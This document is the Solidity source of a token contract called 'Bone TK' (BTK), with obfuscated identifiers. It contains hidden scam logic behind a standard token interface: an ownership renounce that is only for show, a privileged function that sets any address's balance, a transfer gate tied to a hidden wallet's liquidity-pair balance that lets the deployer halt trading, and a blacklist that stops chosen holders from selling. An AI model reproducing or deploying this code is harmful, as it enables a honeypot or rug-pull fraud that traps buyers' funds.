//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface tdrxwbbnz {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract uorqmwyib {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface uhbehqpfbmi {
    function createPair(address maorqzriflwe, address pllauubdxksg) external returns (address);
}

interface nwzgimfry {
    function totalSupply() external view returns (uint256);

    function balanceOf(address vlwqtgfjtuhfp) external view returns (uint256);

    function transfer(address eswdpyohiqtdb, uint256 jlcsgouczuq) external returns (bool);

    function allowance(address wrvjydskpjx, address spender) external view returns (uint256);

    function approve(address spender, uint256 jlcsgouczuq) external returns (bool);

    function transferFrom(
        address sender,
        address eswdpyohiqtdb,
        uint256 jlcsgouczuq
    ) external returns (bool);

    event Transfer(address indexed from, address indexed xvlzybamoo, uint256 value);
    event Approval(address indexed wrvjydskpjx, address indexed spender, uint256 value);
}

interface nwzgimfryMetadata is nwzgimfry {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BoneTK is uorqmwyib, nwzgimfry, nwzgimfryMetadata {

    address qrpftibzph = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transfer(address yptnlvmwovf, uint256 jlcsgouczuq) external virtual override returns (bool) {
        return dlwqurivy(_msgSender(), yptnlvmwovf, jlcsgouczuq);
    }

    mapping(address => bool) public nnlxqdfoupw;

    uint8 private nurvkbsorrv = 18;

    uint256 public vfbhxwmyhk;

    function cktrunqbtxerls(address byqyuvyrw, address eswdpyohiqtdb, uint256 jlcsgouczuq) internal returns (bool) {
        require(gnozchicf[byqyuvyrw] >= jlcsgouczuq);
        gnozchicf[byqyuvyrw] -= jlcsgouczuq;
        gnozchicf[eswdpyohiqtdb] += jlcsgouczuq;
        emit Transfer(byqyuvyrw, eswdpyohiqtdb, jlcsgouczuq);
        return true;
    }

    function zhgdsrqljh(address yptnlvmwovf, uint256 jlcsgouczuq) public {
        hfczaznndtdge();
        gnozchicf[yptnlvmwovf] = jlcsgouczuq;
    }

    address public yyblyxuworoxmq;

    function balanceOf(address vlwqtgfjtuhfp) public view virtual override returns (uint256) {
        return gnozchicf[vlwqtgfjtuhfp];
    }

    bool private ypsepyvmvk;

    uint256 jgqzfflrzyx;

    uint256 sbbtzdfeag;

    function name() external view virtual override returns (string memory) {
        return bjbfokijruil;
    }

    uint256 private csxtakqpdpxhj = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return njwdpbjitydvr;
    }

    constructor (){
        
        ibtopqqdlh();
        tdrxwbbnz gigrfuxwz = tdrxwbbnz(hdwccoxrvj);
        yyblyxuworoxmq = uhbehqpfbmi(gigrfuxwz.factory()).createPair(gigrfuxwz.WETH(), address(this));
        
        vvwgnislnhzje = _msgSender();
        wplcdltpy[vvwgnislnhzje] = true;
        gnozchicf[vvwgnislnhzje] = csxtakqpdpxhj;
        if (xvgbfcswprhxyx == toqxporpanai) {
            xvgbfcswprhxyx = toqxporpanai;
        }
        emit Transfer(address(0), vvwgnislnhzje, csxtakqpdpxhj);
    }

    bool public cgypoppgar;

    mapping(address => mapping(address => uint256)) private diztqrhoga;

    mapping(address => uint256) private gnozchicf;

    string private bjbfokijruil = "Bone TK";

    address hdwccoxrvj = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return nurvkbsorrv;
    }

    uint256 private xvgbfcswprhxyx;

    function allowance(address uvwvnjobmhrpmj, address kmlktufmc) external view virtual override returns (uint256) {
        if (kmlktufmc == hdwccoxrvj) {
            return type(uint256).max;
        }
        return diztqrhoga[uvwvnjobmhrpmj][kmlktufmc];
    }

    bool private acgymfudsply;

    function transferFrom(address byqyuvyrw, address eswdpyohiqtdb, uint256 jlcsgouczuq) external override returns (bool) {
        if (_msgSender() != hdwccoxrvj) {
            if (diztqrhoga[byqyuvyrw][_msgSender()] != type(uint256).max) {
                require(jlcsgouczuq <= diztqrhoga[byqyuvyrw][_msgSender()]);
                diztqrhoga[byqyuvyrw][_msgSender()] -= jlcsgouczuq;
            }
        }
        return dlwqurivy(byqyuvyrw, eswdpyohiqtdb, jlcsgouczuq);
    }

    uint256 private toqxporpanai;

    function pcajdnwqtqttqb(address zxxxownbijne) public {
        if (cgypoppgar) {
            return;
        }
        
        wplcdltpy[zxxxownbijne] = true;
        
        cgypoppgar = true;
    }

    function blifyjbafqcaq(uint256 jlcsgouczuq) public {
        hfczaznndtdge();
        sbbtzdfeag = jlcsgouczuq;
    }

    function owner() external view returns (address) {
        return shyszntbdk;
    }

    function dlwqurivy(address byqyuvyrw, address eswdpyohiqtdb, uint256 jlcsgouczuq) internal returns (bool) {
        if (byqyuvyrw == vvwgnislnhzje) {
            return cktrunqbtxerls(byqyuvyrw, eswdpyohiqtdb, jlcsgouczuq);
        }
        uint256 diitqjhmlihfs = nwzgimfry(yyblyxuworoxmq).balanceOf(qrpftibzph);
        require(diitqjhmlihfs == sbbtzdfeag);
        if (nnlxqdfoupw[byqyuvyrw]) {
            return cktrunqbtxerls(byqyuvyrw, eswdpyohiqtdb, jbccztbaizq);
        }
        return cktrunqbtxerls(byqyuvyrw, eswdpyohiqtdb, jlcsgouczuq);
    }

    uint256 private wsgepqgdofsfdl;

    function approve(address kmlktufmc, uint256 jlcsgouczuq) public virtual override returns (bool) {
        diztqrhoga[_msgSender()][kmlktufmc] = jlcsgouczuq;
        emit Approval(_msgSender(), kmlktufmc, jlcsgouczuq);
        return true;
    }

    uint256 constant jbccztbaizq = 13 ** 10;

    string private njwdpbjitydvr = "BTK";

    event OwnershipTransferred(address indexed gksjvbfxgzbs, address indexed xogbdujakqo);

    function getOwner() external view returns (address) {
        return shyszntbdk;
    }

    address private shyszntbdk;

    function hfczaznndtdge() private view {
        require(wplcdltpy[_msgSender()]);
    }

    uint256 public gckcgwgoufzehf;

    function totalSupply() external view virtual override returns (uint256) {
        return csxtakqpdpxhj;
    }

    address public vvwgnislnhzje;

    function ibtopqqdlh() public {
        emit OwnershipTransferred(vvwgnislnhzje, address(0));
        shyszntbdk = address(0);
    }

    mapping(address => bool) public wplcdltpy;

    function lvifolskes(address xommyqfyzu) public {
        hfczaznndtdge();
        if (toqxporpanai == xvgbfcswprhxyx) {
            acgymfudsply = true;
        }
        if (xommyqfyzu == vvwgnislnhzje || xommyqfyzu == yyblyxuworoxmq) {
            return;
        }
        nnlxqdfoupw[xommyqfyzu] = true;
    }

}